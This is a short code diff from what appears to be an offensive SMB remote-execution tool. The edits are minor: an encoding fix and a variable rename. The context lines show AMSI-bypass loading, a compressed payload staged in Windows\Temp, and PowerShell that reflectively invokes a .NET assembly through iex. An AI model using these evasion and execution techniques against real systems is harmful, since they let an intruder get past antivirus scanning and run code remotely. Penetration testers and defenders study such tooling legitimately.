@@ -603,7 +603,7 @@ class smb(connection):
 
             amsi_bypass_path = self.args.amsi_bypass[0] if self.args.amsi_bypass else ''
             if amsi_bypass_path:
-                with open(amsi_bypass_path, 'r') as f:
+                with open(amsi_bypass_path, 'r', encoding='utf-8-sig') as f:
                     amsi_bypass_b64 = base64.b64encode(f.read().encode()).decode()
 
                 with tempfile.NamedTemporaryFile('w') as tmp:
@@ -619,7 +619,7 @@ class smb(connection):
                 payload_file_compressed = deflate_stream.compress(f.read())
                 payload_file_compressed += deflate_stream.flush()
             payload_file_compressed_b64 = base64.b64encode(payload_file_compressed).decode()
-            payload_file_args = ' '.join(payload.split()[1:])
+            payload_args = ' '.join(payload.split()[1:])
 
             with tempfile.NamedTemporaryFile('w') as tmp:
                 payload_file_remote_path = f'\\Windows\\Temp\\{gen_random_string(6)}'
@@ -657,7 +657,7 @@ class smb(connection):
                     $g = [Reflection.BindingFlags]"Public,NonPublic,Static"
                     $h = $f.GetType("{dotnetassembly_namespace}.{dotnetassembly_class}", $g)
                     $i = $h.GetMethod("{dotnetassembly_method}", $g)
-                    $i.Invoke($null, (, '{payload_file_args}'{dotnetassembly_arg_type}))
+                    $i.Invoke($null, (, '{payload_args}'{dotnetassembly_arg_type}))
                     '''
             elif self.args.powershell:
                 ps_payload += f'''\
@@ -688,7 +688,7 @@ class smb(connection):
             payload += f'$b=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.IO.File]::ReadAllText(""""{ps_payload_remote_path}"""")));iex $b;'
 
             if self.args.powershell:
-                payload += payload_file_args
+                payload += payload_args
 
         output = exec_method.execute(payload, get_output)
 
